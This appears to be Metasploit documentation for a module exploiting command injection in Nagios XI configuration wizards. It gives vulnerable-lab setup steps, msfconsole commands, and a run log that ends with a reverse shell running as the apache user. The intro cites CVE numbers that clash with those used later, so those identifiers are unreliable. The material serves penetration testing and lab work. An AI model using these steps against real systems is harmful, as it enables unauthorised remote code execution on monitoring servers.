## Vulnerable Application
This module exploits CVE-2021-25926, CVE-2021-25927, and CVE-2021-25928: OS command injection vulnerabilities
in `/nagiosxi/config/monitoringwizard.php` that enable an authenticated user to achieve remote code execution
on NagiosXI from versions 5.5.6 to 5.7.5 as the `apache` user. There are three vulnerable configuration wizards
(`windowswmi`, `switch`, `cloud-vm`) that use two vulnerable URL parameters
(`ip_address`, `plugin_output_len`). The `windowswmi` configuration wizard uses the
`plugin_output_len` parameter, while `switch` and `cloud-vm` use the `ip_address` parameter.

The module's `check` method takes advantage of the `Msf::Exploit::Remote::HTTP::NagiosXi` mixin in order to authenticate
to the target and obtain the version of Nagios XI installed, which is then used to check if the target is running a version
of NagiosXI between versions 5.5.6 and 5.7.5.

### Installation Steps
Note: The module can attempt to complete the configuration steps after NagiosXI has been installed.

#### Pre-installed OVA
1. Download an OVA with NagiosXI installed
    1. An OVA with a vulnerable NagiosXI 5.7.5 application can be downloaded from 
    Nagios [here](https://assets.nagios.com/downloads/nagiosxi/5/ovf/nagiosxi-5.7.5-64.ova).
    2. To download other vulnerable versions, replace the version number in the URL with the desired version.
2. Configure the NagiosXI installation
    1. The OVA has NagiosXI running on startup. Launch the VM and visit the VM's IP in a browser.
    2. Go through defaults on the install. When you get to Admin Account Settings, configure the `nagiosadmin`
    user's password and whether you'd like to force HTTPS.
    3. Login as the `nagiosadmin` user and accept the license agreement when prompted.

#### Manual Install on Linux
Note: NagiosXI can only be installed on specific operating systems (RHEL, CentOS, Oracle Linux, Debian, Ubuntu).
Supported version numbers can be found in the installation guide
[here](https://assets.nagios.com/downloads/nagiosxi/docs/Installing-Nagios-XI-Manually-on-Linux.pdf). Older versions of
NagiosXI might require older versions of the operating systems mentioned. Consult the specific version's documentation if errors occur
on newer distributions.

1. Download NagiosXI
    1. Choose a version between 5.5.6 and 5.7.5 from [here](https://www.nagios.com/downloads/nagios-xi/older-releases/)
2. Install NagiosXI with the following commands
    1. `tar xzf xi-5.7.5.gz`
    2. `cd nagiosxi`
    3. `./fullinstall`
3. Configure the NagiosXI installation
    1. Visit the installed NagiosXI application in a web browser.
    2. Go through defaults on the install. When you get to Admin Account Settings, configure the `nagiosadmin`
    user's password and whether you'd like to force HTTPS.
    3. Login as the `nagiosadmin` user and accept the license agreement when prompted.

### Troubleshooting Installation
- NagiosXI doesn't show it's ip address
  - Login as the `root` user with `nagiosxi` as the password, and run `ip a` to get the IP
  - Ensure it's on a network accessible from your attacking machine (e.g. Nat network instead of Bridged)
- NagiosXI fails when attempting to login manually with an "NSP Sorry Dave" message
  - The NagiosXI installation is likely out of sync with its date/time.
  - Set it manually with `timedatectl set-ntp false` and `timedatectl set-time '2023-02-06 17:34:00'` but with the actual time and date

## Verification Steps

- [ ] Start `msfconsole`
- [ ] `use exploit/linux/http/nagios_xi_configwizards_authenticated_rce`
- [ ] `set RHOSTS TARGET_IP`
- [ ] `set RPORT 443`
- [ ] `set SSL true`
- [ ] `set USERNAME USER`
- [ ] `set PASSWORD PASSWORD`
- [ ] `set TARGET_CVE CVE-2021-25296`
- [ ] `set LHOST YOUR_IP`
- [ ] `set LPORT YOUR_LISTENING_PORT`
- [ ] `run`

## Options

### USERNAME
A valid NagiosXI username, which can be for an administrator or regular user.

### PASSWORD
The password for the provided NagiosXI username.

### TARGET_CVE
The CVE to target. Each CVE corresponds to a specific target:
- CVE-2021-25296: `windowswmi` configuration wizard RCE via the `plugin_output_len` URL parameter
- CVE-2021-25297: `switch` configuration wizard RCE via the `ip_address` URL parameter
- CVE-2021-25298: `cloud-vm` configuration wizard RCE via the `ip_address` URL parameter.

Note that CVE-2021-25298 is in the `cloud-vm` configuration wizard but we set the `wizard`
URL parameter value to `digitalocean` in order to make sure we use this wizard; there are
potentially other values that could be used here.

## Scenarios

### CentOS7 running NagiosXI 5.5.6 to 5.7.5 (Official OVA)
```
msf6 > use exploit/linux/http/nagios_xi_configwizards_authenticated_rce
[*] Using configured payload cmd/unix/reverse_perl_ssl
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > set RHOSTS 192.168.104.17
RHOSTS => 192.168.104.17
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > set RPORT 443
RPORT => 443
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > set PASSWORD nagiosadmin
PASSWORD => nagiosadmin
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > set LHOST 192.168.104.2
LHOST => 192.168.104.2
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > set LPORT 8443
LPORT => 8443
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > run

[*] Started reverse SSL handler on 192.168.104.2:8443 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI.
[*] Target is Nagios XI with version 5.7.5.
[+] The target appears to be vulnerable.
[*] Sending the payload...
[*] Command shell session 1 opened (192.168.104.2:8443 -> 192.168.104.17:56742) at 2023-02-06 13:35:49 -0500

id
uid=48(apache) gid=48(apache) groups=48(apache),1000(nagios),1001(nagcmd)
```
